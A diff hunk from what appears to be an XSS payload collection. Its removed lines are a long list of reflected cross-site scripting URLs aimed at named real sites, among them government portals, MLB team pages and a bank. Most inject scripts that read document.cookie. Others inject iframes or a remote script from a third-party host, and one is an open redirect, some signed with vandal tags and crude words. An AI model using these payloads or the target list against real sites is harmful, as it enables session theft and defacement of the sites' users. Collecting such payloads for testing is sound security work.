@@ -4999,502 +4999,1615 @@ innerHTML=location.hash>#<script>alert(1)</script>
 <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xmp id=x style="position:absolute;" onanimationcancel="alert(1)"></xmp>
 <style>@keyframes x{}</style><a style="animation-name:x" onanimationend="alert(1)"></a>
 <style>@keyframes x{}</style><a style="animation-name:x" onanimationstart="alert(1)"></a>
-http://www.nwce.gov.uk/search_process.php?keyword=%22%3e%3cscript%3ealert%28document.cookie%29%3b%3c<br>%2fscript%3e
-http://www.manchester.gov.uk/site/scripts/google_results.php?q=%22%3e%253cscript%3ealert%28document.<br>cookie%29%3b%253c%2fscript%3e&amp;btng=search&amp;ie=&amp;site=&amp;output=xml&amp;client=&amp;lr=&amp;oe=&amp;filter=0
-http://www.ldsmissions.com/us/index.php?action=missionary.info%3cmarquee%3epappy%3c/marquee%3e&amp;missi<br>onary_id=69
-http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\%22%3e%3cscript%3ealert(docume<br>nt.cookie);%3c/script%3e&amp;subdwell=&amp;dwelling=&amp;streetnm=&amp;locality=&amp;hometown=&amp;postcode=&amp;datebrth=&amp;learn<br>gen=&amp;ethnicor=&amp;tel_numb=&amp;tel_mob=&amp;email_add=&amp;email_add2=&amp;agree_info=&amp;username=&amp;password=&amp;err=sur
-http://www.northwarks.gov.uk/site/scripts/google_results.php?q=%22%3e%253cscript%3ealert%28document.<br>cookie%29%3b%253c%2fscript%3e&amp;btng=search&amp;ie=&amp;site=&amp;output=xml&amp;client=&amp;lr=&amp;oe=&amp;filter=0
-http://www.chaoticwars.co.uk/register.php?ref='%3e%3ciframe%20src=http://google.com%3e
-http://www.waverley.gov.uk/site/scripts/google_results.php?q=%22%3e%253cscript%3ealert%28document.co<br>okie%29%3b%253c%2fscript%3e
-http://battleofthevalley.com/register.php?ref='&gt;&lt;iframe%20src=http://google.com&gt;
-http://www.cincinnatibell.com/search/default.asp?query=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;bu<br>siness=true
-http://walkmyplank.net/signup.php?ref=%22%3e%3ciframe%20src=http://google.com%3e%3cfont%20color=red%<br>3e
-http://www.locumco.com.au/register.php?show=pharm&amp;tertmenu=%22;%3c/script%3e%3cscript%3ealert(docume<br>nt.cookie);&lt;/script&gt;&lt;script&gt;
-https://www.scriptlance.com/cgi-bin/freelancers/search.cgi?cats=36&quot;&gt;a&lt;/a&gt;&lt;marquee&gt;pappy was<br>here&lt;/marquee&gt;
-http://www.ectswsr.com.au/register.php?id=24%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e
-http://www.harrow.gov.uk/site/scripts/google_results.php?q=%22%3e%253cscript%3ealert%28document.cook<br>ie%29%3b%253c%2fscript%3e&amp;btng=search&amp;ie=&amp;site=&amp;output=xml&amp;client=&amp;lr=&amp;oe=&amp;filter=0
-http://www.fife.gov.uk/topics/index.cfm?fuseaction=straydogs.list&amp;subjectid=a6dea850-1d42-47be-9e75f<br>1d7b465ac63&amp;subjectid=a6dea850-1d42-47be-9e75f1d7b465ac63&amp;breed=&amp;coat=&amp;colour=%22%3e%3cscript%3ealer<br>t%28document.cookie%29%3b%3c%2fscript%3e&amp;location=&amp;finddogs=go
-http://www.icteach.com.au/register.php?id=55%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e
-http://visualarts.qld.gov.au/designyourowntour/register.php?user=found&amp;message=username%20already%20<br>exists%20in%20database&amp;requsername=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://visualarts.qld.gov.au/designyourowntour/list.php?message=%3cscript%3ealert(document.cookie);%<br>3c/script%3e
-http://criminalmadness.net/register.php?ref=test'%3e%3ciframe%20src=http://google.com%3e
-http://www.sovrep.gov.by/index.php/main.html?sstring=%3cscript%3ealert(document.cookie);%3c/script%3<br>e%3e
-http://www.corp-gov.ru/forum/index.php3?node_id=1936%22%3etest%3c/a%3e%3cscript%3ealert(document.coo<br>kie);%3c/script%3e&amp;startrow=%22%3e%3c/a%3etesticles%3cscript%3ealert(document.cookie);%3c/script%3e
-http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=%22%3e%3cscript%3ealert(documen<br>t.cookie);%3c/script%3e
-http://ufo.gov.ru/search/?string=%3cscript%3ealert(document.cookie);%3c/script%3e%3e
-http://prima-tv.ru/search/?string=&quot;&gt;&lt;iframe+src=http://google.com&gt;
-http://www.ttdaren.gov.tw/daren/instpage.php?r=&amp;w=&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;h=&lt;script<br>&gt;alert(document.cookie);&lt;/script&gt;&amp;url=google.com&gt;&lt;/iframe&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles%22%3ea%3c/a%3e%3cscript%3ealert(<br>document.cookie);%3c/script%3e
-http://www.podzem.ru/send.php?f_feedbackname=%3cscript%3ealert(document.cookie);%3c/script%3e
-http://www.realtimeworlds.com/index.php?id=4&amp;pid=4&amp;nid=%3cscript%3ealert(document.cookie);%3c/script<br>%3e
-http://www.gofreecredit.com/report.php?id=9915&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;b=lp168&quot;&gt;&lt;s<br>cript&gt;alert(document.cookie);&lt;/script&gt;&amp;lte=all&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;subid=ftr+t<br>y&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://kone-liga.ru/search/?q=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://izhmoto.ru/default/search_results?what=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e
-http://www.tass-ural.ru/register.php?email=&quot;&gt;&lt;script&gt;alert('u');&lt;/script&gt;&lt;script&gt;alert('s');&lt;/script<br>&gt;&lt;script&gt;alert('a');&lt;/script&gt;&lt;script&gt;alert('pappy was here!');&lt;/script&gt;
-http://www.allo.perm.ru/site?resource=%3cscript%3ealert('pappy%20was%20here!');%3c/script%3e
-http://tpshop.ru/index.php?page_key=price_search&amp;group_id=0&amp;q=test%3c%2ftitle%3e%3cscript%3ealert%28<br>%27pappy+was+here%21%27%29%3b%3c%2fscript%3e&amp;in_mark=1&amp;in_title=1&amp;price_min=&amp;price_max=&amp;orderby=titl<br>e&amp;order=asc
-http://antonys.irk.ru/register.php?email=%3cscript%3ealert(document.cookie);%3c/script%3e%3e
-http://stringer.ru/search.mhtml?search=&quot;&gt;&lt;marquee&gt;pappy was here&lt;/marquee&gt;&lt;!--%3cscript%3ealert(document.cookie);%<br>3c/script%3e
-http://dentarusshop.ru/show_fine.php?select=name&amp;name=%3cscript%3ealert(document.cookie);%3c/script%<br>3e
-http://www.motorsale.ru/search/?searchtxt=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e
-http://www.memorec.ru/register.php?sesid=blah'%3etest%3c/a%3e%3cscript%3ealert(document.cookie);%3c/<br>script%3e
-http://ga1.org/ntu_action/join.tcl?qp_source=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e
-http://www.thetaxreliefsite.com/?refid=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://enable.nat.gov.tw/valid.jsp?category=testicles%22%3ea%3c/a%3e%3cscript%3ealert(document.cooki<br>e);%3c/script%3e
-http://www.knoxcounty.org/search/sresults.php?search=%22%29%3balert%28document.cookie%29%3b%2f%2f
-http://www.globalgateway.com/search.asp?criteria=%3cscript%3ealert%28document.cookie%29%3b%3c%2fscri<br>pt%3e
-http://ipcat.leeds.ac.uk/do_search.asp?dosearch=search&amp;title=%3cscript%3ealert%28document.cookie%29%<br>3b%3c%2fscript%3e&amp;titlekeywords=&amp;publisherkeywords=&amp;issuingkeywords=&amp;issn=&amp;library=
-http://www.marinesanctuariesmedia.com/search.php?keyword=%3cscript%3ealert(document.cookie);%3c/scri<br>pt%3e
-http://www.cameraforless.com/search.asp?keyword=%3cscript%3ealert(document.cookie);%3c/script%3e
-http://www.projusticia.org.pe/site.php?plantilla=busqueda&amp;txt_filtro=%3cscript%3ealert%28document.co<br>okie%29%3b%3c%2fscript%3e
-http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&amp;texto=%3cscript%3ealert(document.cookie);%3c/s<br>cript%3e
-http://www.vbulletin.org/forum/forumdisplay.php?f=228&amp;threadprefix=%3cscript%3ealert(document.cookie<br>);%3c/script%3e
-http://search.moh.gov.my/i/?s=1169536581265&amp;p=&lt;/title&gt;&lt;iframe+src=http://google.com&gt;
-http://bologna.annuncinetwork.com/search.php?keyword=%22%3e%3cscript%3ealert(document.cookie);%3c/sc<br>ript%3e
-http://uk.singerspro.com/search_all.php?uid=&amp;name=&amp;keyword='&gt;&lt;script&gt;alert(document.cookie);&lt;/script<br>&gt;
-http://www.tax.virginia.gov/site.cfm?alias=&quot;&gt;&lt;/a&gt;&lt;iframe+src=http://google.com&gt;
-http://www.gameinw.com/pageth.php?keyword=%3cscript%3ealert(document.cookie);%3c/script%3e
-http://webindex.giggog.com/search.php?keyword=%22%3e%3cscript%3ealert%28document.cookie%29%3b%3c%2fs<br>cript%3e
-http://tiempo.meteored.com/buscar.php?criterio=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://db.th.gov.tw/phorum/login.php?f=0&amp;target=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://register.typc.doh.gov.tw/netreg/choosedep.asp?mode=%22%3e%3cframe%20src=%22javascript:alert('<br>pappy was here');%22%3e%3c/frameset%3e&amp;subseq=y
-http://epaper.vac.gov.tw/admin/web/content.php?mc_sn=45&amp;ts_sn=%3cscript%3ealert(document.cookie);%3c<br>/script%3e
-http://www.kccc.gov.tw/cgi/searcher.exe?s=1&amp;o=3&amp;f=1&amp;t=2&amp;a=15&amp;k=1,&amp;g=0&amp;mergefield=-&amp;codeconvert=-&amp;sor<br>tfields=1&amp;sim_start=1&amp;sim_num=10&amp;rel_start=1&amp;rel_num=10&amp;link=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/scri<br>pt&gt;&amp;redirectto=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;pathlink=-&amp;p=%a6~%a5%cd&amp;b=16&amp;page=20
-http://www.lugu.gov.tw/4images/register.php?sessionid=&quot;&gt;&lt;iframe src=http://google.com&gt;&lt;!--
-http://www.mjob.in.th/search1_result.php?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;jobtype=<br>&amp;province=
-http://www.autosanjuan.com.ar/busqueda.php?x=0&amp;y=0&amp;anio_desde=%27%3e%3c%2fa%3e%3cscript%3ealert%28do<br>cument.cookie%29%3b%3c%2fscript%3e&amp;anio_hasta=&amp;km_desde=&amp;km_hasta=&amp;precio_desde=&amp;precio_hasta=&amp;tipo=<br>+++++++++1&amp;marca=0&amp;modelo=0&amp;estado=0&amp;segmento=0&amp;combustible=0&amp;tipo_vendedor=0&amp;ubicacion=0
-http://cardealerforums.com/car-dealer-forum-news/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/sc<br>ript&gt;
-http://www.netstumbler.org/f55/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-https://www.albemarle.org/department.asp?department=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.mcseboard.de/windows-forum-lan-wan-32/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/sc<br>ript&gt;
-http://www.prenatalyogacenter.com/forums/introduce-yourself/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.c<br>ookie);&lt;/script&gt;
-http://vbmodder.com/forums/f26/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.experienceadvertising.com/forum/f47/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/scri<br>pt&gt;
-http://rg-rb.de/search/?keywords=&quot;&gt;a&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://gojeebus.com/search.php?keyword=&lt;/title&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://board.jokeroo.com/announcements/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.thefreedictionary.com/%22%3b%3c%2fscript%3e%3cscript%3ealert(document.cookie)%3b%3c%2fscr<br>ipt%3e
-http://medical-dictionary.thefreedictionary.com/%22%3b%3c%2fscript%3e%3cscript%3ealert(document.cook<br>ie)%3b%3c%2fscript%3e
-http://legal-dictionary.thefreedictionary.com/%22%3b%3c%2fscript%3e%3cscript%3ealert(document.cookie<br>)%3b%3c%2fscript%3e
-http://financial-dictionary.thefreedictionary.com/%22%3b%3c%2fscript%3e%3cscript%3ealert(document.co<br>okie)%3b%3c%2fscript%3e
-http://idioms.thefreedictionary.com/%22%3b%3c%2fscript%3e%3cscript%3ealert(document.cookie)%3b%3c%2f<br>script%3e
-http://encyclopedia2.thefreedictionary.com/%22%3b%3c%2fscript%3e%3cscript%3ealert(document.cookie)%3<br>b%3c%2fscript%3e
-http://encyclopedia.thefreedictionary.com/%22%3b%3c%2fscript%3e%3cscript%3ealert(document.cookie)%3b<br>%3c%2fscript%3e
-http://creditcardforum.com/finance-charges-apr-compare/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie<br>);&lt;/script&gt;
-http://english.nyc.gov.tw/simple_search.php?sn=&amp;act=&amp;search1=%22%3e%3cscript%3ealert%28document.cook<br>ie%29%3b%3c%2fscript%3e&amp;linkw=and&amp;search2=&amp;time_limit=all&amp;resu_num=10&amp;hl=en&amp;btng=nyc%27s+search
-http://www.activedayton.com/beavercreek/restaurants/145605/usercomment.jspd?id=145605&amp;activity=ratin<br>g&amp;searchcriteriaurl=c2l0zwlkptexmdembglzdgluz3r5cgu9mtawmdembmvpz2hib3job29kawq9mtazndqwjmn1cnjlbnrw<br>ywdlpti=&amp;searchtype=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.gnutellaforums.com/getting-started-using-limewire/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.<br>cookie);&lt;/script&gt;
-http://www.austintamilsangam.org/modules/xoogle/index.php?query=%22%3e%3c%2fa%3e%3cscript%3ealert%28<br>document.cookie%29%3b%3c%2fscript%3e&amp;search=web&amp;lr=lang_zh-tw
-http://www.gaystudenterna.se/sfg/search.php?query=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://absolutdrinks.com/community/login.aspx?chk=&amp;q=&amp;x=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;0&amp;<br>y=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;0
-http://www.vbhackers.com/f104/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://pkgsrc.se/search.php?so=%22%3e%3cscript%3ealert%28document.cookie%29%3b%3c%2fscript%3e
-http://archive.netbsd.se/search.php?ml=%3c/a%3e%3cscript%3ealert(document.cookie);%3c/script%3e
-http://www.ecoogler.com/search.php?keyword=%22%3e%3cscript%3ealert%28document.cookie%29%3b%3c%2fscri<br>pt%3e&amp;btng=search&amp;mtk=uk&amp;enviado=1&amp;s=0&amp;n=10
-http://www.mambers.com/general-announcements/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script<br>&gt;
-http://www.energy-enviro.fi/index.php?page=1506&amp;printarea=%3cscript%3ealert(document.cookie);%3c/scr<br>ipt%3e
-http://www.ourfreeonlinelayouts.info/generators/myspace-layout-code.php&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.masslottery.com/cgi-bin/search_dir/search.cgi?q=&quot;&gt;&lt;script&gt;alert('zomg pappy won the<br>lottery!');&lt;/script&gt;&amp;e=1&amp;x=0
-http://tlogr.com/testmb.php?keywords=%3cscript%3ealert(document.cookie);%3c/script%3e
-http://www.yiparts.com/world/search.php?ie=utf-8&amp;oe=utf-8&amp;hl=en&amp;q=%22%3e%3cscript%3ealert%28document<br>.cookie%29%3b%3c%2fscript%3e&amp;sitesearch=www.yiparts.com&amp;submit2=website+search
-http://valeriu.clipta.com/search.php?q=%3cscript%3ealert(document.cookie);%3c/script%3e
-http://news.giggog.com/search.php?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.opensecrets.org/indivs/donor_lookup.php?name=%3cscript%3ealert(document.cookie);%3c/scrip<br>t%3e
-http://search.ieice.org/bin/fulltext_search.php?key=%22%3e%3cscript%3ealert%28document.cookie%29%3b%<br>3c%2fscript%3e&amp;dosearch=search&amp;e_index_a=on&amp;e_index_b=on&amp;e_index_c=on&amp;e_index_d=on&amp;e_index_e=on&amp;j_e_<br>index_a=on&amp;j_e_index_b=on&amp;j_e_index_c=on&amp;j_e_index_d=on&amp;lang=e
-http://www3.marketwatch.com/store/default.aspx?dist=&amp;siteid=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/s<br>cript&gt;
-http://bigcharts.marketwatch.com/symbollookup/symbollookupresults.asp?symb=%22');alert(document.cook<br>ie);//&amp;country=all&amp;type=all
-http://www.globalgateway.com/addurl.asp?category=12&amp;cfile=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/scr<br>ipt&gt;
-http://forum.vbulletinsetup.com/f4/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://wdfw.wa.gov/fish/ans/identify/search.php?searchby=speciesfamilycategory&amp;search=&quot;&gt;&lt;/a&gt;&lt;script&gt;<br>alert(document.cookie);&lt;/script&gt;
-http://info4-entertainment.com/search.php?keyword=%3cscript%3ealert(document.cookie);%3c/script%3e
-http://s-e-arch.com/search.php?keyword=%3c/title%3e%3cscript%3ealert(document.cookie);%3c/script%3e
-http://citationmachine.net/index.php?page=%3e%3c/a%3e%3cscript%3ealert(document.cookie);%3c/script%3<br>e
-http://www.storage-academy.com/new_academy/register.php?id=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/sc<br>ript&gt;
-http://my.hardwarezone.com/core/search.php?submit.x=1&amp;submit.y=1&amp;q=%3cscript%3ealert(document.cookie<br>);%3c/script%3e
-http://cookingwithsql.com/tinystats/domainlinks.php?thedomain=%3ciframe+src=http://google.com&gt;
-http://www.belstat.com/viewtab_se.asp?userid=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e
-http://www.libcat.oxfordshire.gov.uk/cgi-bin/vps2.5_viewpoint.sh?enqtype=phrase&amp;authpara1=&quot;&gt;&lt;script&gt;<br>alert(document.cookie);&lt;/script&gt;
-http://www.catalogue.sefton.gov.uk/cgi-bin/viewpoint_server.sh?enqtype=phrase2&amp;authpara1=&quot;&gt;&lt;script&gt;a<br>lert(document.cookie);&lt;/script&gt;&amp;session_no=146663&amp;catsect=
-http://www.ibm.com/developerworks/views/global/tutorials.jsp?sort_by=title&amp;show_abstract=true&amp;zone_b<br>y=all+zones&amp;topic_by=all+topics&amp;search_by=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;submit.x=0&amp;subm<br>it.y=0
-http://galaxy.ealing.gov.uk/cgi-bin/vps2.5_viewpoint.sh?enqtype=authortitle&amp;enqpara1=default&amp;s_strin<br>g=testino%2c+mario&amp;s_type='a'&amp;no_of_results=9&amp;authorpage=0&amp;authorrecord=1&amp;sec_stng=&amp;media_stng=&amp;sess<br>ion_no=1443500&amp;time=7917&amp;page=-1&amp;search_string=%22%3e%3c/a%3e%3cscript%3ealert(document.cookie);%3c/<br>script%3e
-http://www.treadclimber.com/global/content_basic.jsp?folder%3c%3efolder_id=2534374302031664&amp;bmuid=12<br>13393925797&amp;adid=dsetdir&amp;originalhostname=&quot;;alert(document.cookie);//&amp;bmuid=1213393931143
-http://www.flymanchester.com/flightinfo/index.php?view=&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://botdb.abcc.ncifcrf.gov/seqanal/seqresults.jsp?extension=ssearch&amp;pbsid=&quot;&gt;&lt;script&gt;alert(documen<br>t.cookie);&lt;/script&gt;
-http://www.tcdb.org/tcdb/index.php?tc=&quot;&gt;&lt;frameset&gt;&lt;frame src=&quot;javascript:alert('xss');&quot;&gt;&lt;/frameset&gt;
-http://modern-empires.ej.am/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.workingtitlefilms.com/emailfriend.php?pageurl=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://tsla-teva.state.tn.us/cdm4/results.php?cisoop1=any&amp;cisofield1=cisosearchall&amp;cisoroot=&quot;&gt;&lt;/a&gt;te<br>sticles&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.ajp.com/title.php?ititlenum=4286&amp;artistid=--%3e%3cscript%3ealert(document.cookie);%3c/scr<br>ipt%3e
-http://environment-data.uchicago.edu/esintern/detail.cfm?jobid=%3cscript%3ealert(document.cookie);%3<br>c/script%3e
-http://www.srmg.com/templates/srmg/searchtemplate.aspx?postingid=317&amp;keywords=%3cscript%3ealert(docu<br>ment.cookie);%3c/script%3e
-http://www.metmeetings.org/?section=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.azleg.state.az.us/documentsforbill.asp?bill_number=%3ciframe+src=http://google.com%3e%3e&amp;<br>image.x=0&amp;image.y=0
-http://www.azleg.gov/documentsforbill.asp?bill_number=%3ciframe+src=http://google.com%3e%3e&amp;image.x=<br>0&amp;image.y=0
-http://www.abcteach.com/search.php?q=&quot;&gt;&lt;script/src=http://www.altan.hr/snow/snow1.js&gt;&lt;/script&gt;&amp;searc<br>h_type=1&amp;match_words=2&amp;limit_search=1&amp;_form_action=abcteach search&amp;search_form1_form_visited=1
-http://www.arabnews.com/?page=1&amp;section=0&amp;article=63138&amp;d=3&amp;m=5&amp;y=2005&amp;pix=%22%3ekingdom.jpg&amp;categor<br>y=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e
-http://www.bennadel.com/index.cfm?dax=--&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.bitenova.nl/s/0/<script>alert("phnjcmlwdd5hbgvydchkb2n1bwvudc5jb29rawupozwvc2nyaxb0pg..")<\script>
-http://www.keyworddensity.com/search_engine_optimization/keyword_density.cgi<br>y=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e
-http://www.nationwars.net/register_step1.php?ref=1'&gt;&lt;iframe%20src=http://google.com&gt;
-http://zetapets.com/register.php?ref=testicles&quot;&gt;a&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script
-http://vietany.com/home/utube.php?tag=php&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&lt;!-- &amp;pageid=10
-http://www.thegreene.com/tenant.cfm?tenantid=50&amp;tenantspace=e9&amp;tenantx=-1180&amp;tenanty=-');alert('xss'<br>);//
-http://www.cosmeticscop.com/search/search.asp?keys=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;x=<br>0&amp;y=0
-http://myespn.go.com/myespn/includes/communityads?titlecolor=0;}&lt;/style&gt;&lt;/script&gt;&lt;script&gt;alert(docum<br>ent.cookie);&lt;/script&gt;&amp;amp;bodycolor=boobs&amp;amp;urlcolor=balls&amp;amp;backcolor=penis&amp;amp;extpadcolor=dic<br>k&amp;amp;intpadcolor=testicles
-http://www.hsbc.co.uk/1/2/!ut/p/kcxml/04_sj9spykssy0xplmnmz0vm0y_qjzkln4l39gljmmu7xrub6kciixjeo8ifgv<br>s99x098nnt9qp0c3jdi8odhrubf0cb6a!!/delta/base64xml/l0lkayevd0znqurbisevnelfrs9jbnrlcm5hbfnlyxjjaa!!;<br>jsessionid=0000rszl-xicinnawwljlabjmjq:12ntf1n0a?sq=--%3etesticles&amp;st=1&amp;ssid=%22%3e%3cscript%3ealert<br>(document.cookie);%3c/script%3e&amp;stask=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3eeukuka00<br>01
-http://walkmyplank.net/login.php?lgc=%3cscript%3ealert(document.cookie);%3c/script%3e
-http://www.pornbits.com/?sb=--&gt;&quot;;&lt;/script&gt;&quot;&gt;\\&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://informe.com/category/0/all?field=title&amp;searchstring=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script<br>&gt;&amp;x=0&amp;y=0
-http://mlb.mlb.com/components/global/click_through.html?jumpto=http://google.com
-http://users.gametrailers.com/password_reset_script.php?input[email]=&amp;input[hash]=--%3e%3cscript%3ea<br>lert(document.cookie);%3c/script%3e
-http://www.nstalker.com/nstalker/updates/index.php?code=9e99c11a228c55c803e45a4101448946;--&gt;&lt;script&gt;<br>alert(document.cookie);&lt;/script&gt;
-http://mlb.mlb.com/mlb/sweepstakes/y2008/state_farm/callyourshot_sweeps.jsp?sf_ref=%22%3e%3cscript%3<br>ealert(document.cookie);%3c/script%3e&amp;partnerid=s00468
-http://boston.redsox.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy was here');&lt;/script&gt;
-http://chicago.whitesox.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;
-http://baltimore.orioles.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;
-http://cleveland.indians.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;
-http://detroit.tigers.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;
-http://kansascity.royals.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;
-http://losangeles.angels.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;
-http://minnesota.twins.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;
-http://oakland.athletics.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;
-http://seattle.mariners.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;
-http://tampabay.rays.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;
-http://texas.rangers.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;
-http://toronto.bluejays.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;
-http://arizona.diamondbacks.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/scri<br>pt&gt;
-http://atlanta.braves.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;
-http://chicago.cubs.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;
-http://cincinnati.reds.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;
-http://colorado.rockies.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;
-http://florida.marlins.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;
-http://houston.astros.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;
-http://losangeles.dodgers.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script<br>&gt;
-http://milwaukee.brewers.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;
-http://newyork.mets.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;
-http://philadelphia.phillies.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/scr<br>ipt&gt;
-http://pittsburgh.pirates.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script<br>&gt;
-http://stlouis.cardinals.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;
-http://sandiego.padres.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;
-http://sanfrancisco.giants.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/scrip<br>t&gt;
-http://washington.nationals.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/scri<br>pt&gt;
-http://www.playlist.com/websearch?searchfor='&gt;&lt;marquee&gt;testicles was here&lt;/marquee&gt;&amp;search=search
-http://www.webmaster-talk.com/php-forum/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.rhinotalk.net/forums/member-introductions/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cook<br>ie);&lt;/script&gt;
-http://www.buy-host.com/forums/news-updates/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/scr<br>ipt&gt;
-http://www.gamerzneeds.net/forums/news/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
